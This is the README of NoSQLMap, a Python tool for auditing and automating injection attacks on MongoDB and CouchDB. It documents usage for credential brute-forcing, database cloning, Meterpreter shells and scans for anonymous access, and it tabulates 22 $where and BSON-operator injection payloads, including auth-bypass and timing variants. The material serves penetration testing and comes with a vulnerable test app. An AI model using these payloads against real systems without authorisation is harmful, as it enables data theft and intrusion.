# NoSQLMap

[![Python 3](https://img.shields.io/badge/python-3-blue.svg)](https://www.python.org/)
[![License](https://img.shields.io/badge/license-GPLv3-red.svg)](https://github.com/codingo/NoSQLMap/blob/master/COPYING)
[![Twitter](https://img.shields.io/badge/twitter-@codingo__-blue.svg)](https://twitter.com/codingo_)

NoSQLMap is an open source Python tool designed to audit for as well as automate injection attacks and exploit default configuration weaknesses in NoSQL databases and web applications using NoSQL in order to disclose or clone data from the database.

Originally authored by [@tcsstool](https://twitter.com/tcstoolHax0r), later maintained by [@codingo\_](https://twitter.com/codingo_) and ported to python3 by [@egongu90](https://github.com/egongu90) NoSQLMap is named as a tribute to Bernardo Damele and Miroslav's Stampar's popular SQL injection tool [sqlmap](http://sqlmap.org). Its concepts are based on and extensions of Ming Chow's excellent presentation at Defcon 21, ["Abusing NoSQL Databases"](https://www.defcon.org/images/defcon-21/dc-21-presentations/Chow/DEFCON-21-Chow-Abusing-NoSQL-Databases.pdf).

## NoSQLMap MongoDB Management Attack Demo.

<a href="http://www.youtube.com/watch?feature=player_embedded&v=xSFi-jxOBwM" target="_blank"><img src="http://img.youtube.com/vi/xSFi-jxOBwM/0.jpg" alt="NoSQLMap MongoDB Management Attack Demo" width="240" height="180" border="10" /></a>

## Screenshots

![NoSQLMap](https://github.com/codingo/NoSQLMap/blob/master/screenshots/NoSQLMap-v0-5.jpg)

# Summary

## What is NoSQL?

A NoSQL (originally referring to "non SQL", "non relational" or "not only SQL") database provides a mechanism for storage and retrieval of data which is modeled in means other than the tabular relations used in relational databases. Such databases have existed since the late 1960s, but did not obtain the "NoSQL" moniker until a surge of popularity in the early twenty-first century, triggered by the needs of Web 2.0 companies such as Facebook, Google, and Amazon.com. NoSQL databases are increasingly used in big data and real-time web applications. NoSQL systems are also sometimes called "Not only SQL" to emphasize that they may support SQL-like query languages.

## DBMS Support

Presently the tool's exploits are focused around MongoDB, and CouchDB but additional support for other NoSQL based platforms such as Redis, and Cassandra are planned in future releases.

## Requirements

On a Debian or Red Hat based system, the setup.sh script may be run as root to automate the installation of NoSQLMap's dependencies.

Varies based on features used:

-   Metasploit Framework,
-   Python with PyMongo,
-   and urllib available.
-   A local, default MongoDB instance for cloning databases to. Check [here](http://docs.mongodb.org/manual/installation/) for installation instructions.

There are some various other libraries required that a normal Python installation should have readily available. Your milage may vary, check the script.

## Setup

```
pip install -r requirements.txt
pip install .
```

Alternatively you can build a Docker image by changing to the docker directory and entering:

```
docker build -t nosqlmap .
```

or you can use Docker-compose to run Nosqlmap:

```
docker-compose build
docker-compose run nosqlmap
```

## Usage Instructions

Start with

```
nosqlmap
```

NoSQLMap uses a menu based system for building attacks. Upon starting NoSQLMap you are presented with with the main menu:

```
1-Set options (do this first)
2-NoSQL DB Access Attacks
3-NoSQL Web App attacks
4-Scan for Anonymous MongoDB Access
x-Exit
```

Explanation of options:

```
1. Set target host/IP-The target web server (i.e. www.google.com) or MongoDB server you want to attack.
2. Set web app port-TCP port for the web application if a web application is the target.
3. Set URI Path-The portion of the URI containing the page name and any parameters but NOT the host name (e.g. /app/acct.php?acctid=102).
4. Set HTTP Request Method (GET/POST)-Set the request method to a GET or POST; Presently only GET is implemented but working on implementing POST requests exported from Burp.
5. Set my local Mongo/Shell IP-Set this option if attacking a MongoDB instance directly to the IP of a target Mongo installation to clone victim databases to or open Meterpreter shells to.
6. Set shell listener port-If opening Meterpreter shells, specify the port.
7. Load options file-Load a previously saved set of settings for 1-6.
8. Load options from saved Burp request-Parse a request saved from Burp Suite and populate the web application options.
9. Save options file-Save settings 1-6 for future use.
x. Back to main menu-Use this once the options are set to start your attacks.
```

Once options are set head back to the main menu and select DB access attacks or web app attacks as appropriate for whether you are attacking a NoSQL management port or web application. The rest of the tool is "wizard" based and fairly self explanatory, but send emails to codingo@protonmail.com or find me on Twitter [@codingo\_](https://twitter.com/codingo_) if you have any questions or suggestions.

## Command-line usage

You can drive NoSQLMap non-interactively with the `--attack` flag instead of
the menu:

```
nosqlmap --attack <1|2|3> --platform <MongoDB|CouchDB> --victim <host> [options]
```

| `--attack` | Mode | What it does | Key options |
|------------|------|--------------|-------------|
| `1` | NoSQL DB Access Attacks | Target a database directly on its management port: check anonymous access, **brute-force credentials**, clone databases, or open a shell | `--victim`, `--dbPort`, `--myIP`, `--myPort` |
| `2` | NoSQL Web App attacks | Inject into a web application's NoSQL queries (see [vuln_apps](vuln_apps/README.md) for worked examples) | `--victim`, `--webPort`, `--uri`, `--params` |
| `3` | Scan for Anonymous platform Access | Scan a subnet (or an IP list from a file) for NoSQL instances that allow **anonymous/default** access | `--platform`, `--victim` |

### DB Access Attacks (`--attack 1`)

Targets a database directly (MongoDB default port `27017`, CouchDB `5984`).
After the CLI connectivity check this mode is still wizard-driven: it prompts
you to select the specific attack and, when brute-forcing, the username,
character set, and maximum password length.

```bash
# MongoDB direct access / brute-force
nosqlmap --attack 1 --platform MongoDB --victim 127.0.0.1 --dbPort 27017

# CouchDB direct access
nosqlmap --attack 1 --platform CouchDB --victim 127.0.0.1 --dbPort 5984
```

### NoSQL Web App attacks (`--attack 2`)

Injects into a web application's NoSQL queries. The `--uri` argument must
include the query string (`?param=value`) — the tool parses the parameters from
it — and `--params` selects which parameter(s) to inject by **1-based index**
(comma-separated; `1` = the first parameter). `--httpMethod` defaults to `GET`
(use `POST` with `--postData` for form submissions).

```bash
# GET: inject into the first query parameter of /acct.php?acctid=42
nosqlmap --attack 2 --victim 127.0.0.1 --webPort 8080 \
    --uri '/acct.php?acctid=42' --params 1 \
    --injectSize 8 --injectFormat 1 --verb ON
```

Useful options: `--injectSize` (length of the random baseline string),
`--injectFormat` (`1`=alphanumeric, `2`=letters, `3`=numbers, `4`=email),
`--doTimeAttack` (`y`/`n` for timing-based tests), and `--savePath` (write the
vulnerable / possibly-vulnerable URLs to a file). See
[vuln_apps/README.md](vuln_apps/README.md) for worked examples against the
bundled vulnerable app.

### Scan for Anonymous Access (`--attack 3`)

Scans a subnet (or an IP list loaded from a file) for NoSQL instances that
allow anonymous or default access. It is wizard-driven: it prompts for the
subnet or file to scan, then offers to save results to CSV and to launch an
attack against any discovered target.

```bash
nosqlmap --attack 3 --platform MongoDB
```

## Injection payloads

`--attack 2` (web app attacks) tries the following payloads against the selected
parameter. `P` is the target parameter name and `R` is the random baseline
string; each payload is URL-encoded on the wire. The tool compares each
response size against the baseline (index `0`) to detect injection.

| # | Injected value (decoded) | Class / purpose |
|---|--------------------------|-----------------|
| `0` | `P=R` | Baseline (random value, the control) |
| `1` | `P[$ne]=R` | BSON operator `$ne` (not-equals) |
| `2` | `P=a'; return db.a.find(); var dummy='!` | `$where` JS injection — string escape, `find()` (all records) |
| `3` | `P=1; return db.a.find(); var dummy=1` | `$where` JS injection — integer escape, `find()` |
| `4` | `P=a'; return db.a.findOne(); var dummy='!` | `$where` JS injection — string escape, `findOne()` (single record) |
| `5` | `P=1; return db.a.findOne(); var dummy=1` | `$where` JS injection — integer escape, `findOne()` |
| `6` | `P=a'; return this.a != 'R'; var dummy='!` | `$where` JS injection — string escape, `this.a !=` (auth bypass) |
| `7` | `P=1; return this.a != R; var dummy=1` | `$where` JS injection — integer escape, `this.a !=` |
| `8` | `P[$gt]=` | BSON operator `$gt` (greater-than, undefined) |
| `9` | `P=1; var date = new Date(); … while(…< 10); return; var dummy=1` | Timing/delay injection (10-second sleep) |
| `10` | `P=a"; return db.a.find(); var dummy='!` | `$where` JS injection — double-quote, `find()` |
| `11` | `P=a"; return this.a != 'R'; var dummy='!` | `$where` JS injection — double-quote, `this.a !=` |
| `12` | `P=a"; return db.a.findOne(); var dummy="!` | `$where` JS injection — double-quote, `findOne()` |
| `13` | `P=a"; var date = new Date(); … while(…< 10); return; var dummy="!` | Timing/delay injection — double-quote |
| `14` | `Pa'; return true; var dum='a` | `$where` JS injection — string escape, `return true` (no `=`) |
| `15` | `P1; return true; var dum=2` | `$where` JS injection — integer, `return true` (no `=`) |
| `16` | `P=a'; ---` | Template — `---` is replaced by `getDBInfo` (return-true / calc / char / user / hash) |
| `17` | `P=1; if ---` | Template — numeric `if` variant for DB attacks |
| `18` | `P=a'; var date = new Date(); … while(…< 10); return; var dummy='!` | Timing/delay injection — string escape |
| `19` | `P[$in]=` | BSON operator `$in` (associative-array, undefined) |
| `20` | `P[$regex]=` | BSON operator `$regex` (associative-array, undefined) |
| `21` | `P[$eq]=` | BSON operator `$eq` (associative-array, undefined) |
| `22` | `P[$exists]=` | BSON operator `$exists` (associative-array, undefined) |

The payload bodies are defined in `nosqlmap/web.py` (`buildUri`) and their
format is pinned by the unit tests in `tests/test_web.py`.

## Vulnerable Applications

This repo also includes an intentionally vulnerable web application to test NoSQLMap with. To run this application, you need Docker installed. Then you can run the following commands from the /vuln_apps directory.

```
docker-compose build && docker-compose up
```

Once that is complete, you should be able to access the vulnerable application by visiting: http://127.0.0.1:8080/index.html

## Development & Testing

NoSQLMap is a Python 3 package. Set up a development environment and run the
test suite as follows.

### Setup

```bash
python -m venv .venv
source .venv/bin/activate          # Windows: .venv\Scripts\activate
pip install -r requirements.txt -r requirements-dev.txt
pip install -e .                   # installs the `nosqlmap` command
```

### Running the tests

```bash
pytest            # full suite
pytest -k web     # only the web-payload / web-attack tests
```

The suite has two layers:

| File | What it covers |
|------|----------------|
| `tests/test_web.py` | Random-string builder **and the format of every `buildUri` injection payload** |
| `tests/test_cli.py` | Request-building helpers (headers, POST data) |
| `tests/test_brute.py` | Brute-force primitives (`genBrute`, charsets) |
| `tests/test_mongodb.py` | The MongoDB MD5 auth verifier (`verify_md5`) |
| `tests/test_couchdb.py` | The CouchDB password-hash verifier (`verify_couch`) |
| `tests/test_scan.py` | Subnet-iteration logic for the scanner |
| `tests/test_vuln_app.py` | **Functional** tests against the running vuln app (see below) |

### Functional tests

`tests/test_vuln_app.py` exercises the real web endpoints, so the stack must be
running first:

```bash
cd vuln_apps
docker compose up -d --build
```

Point the tests at a non-default host/port with the `NOSQLMAP_APP_URL`
environment variable if needed.
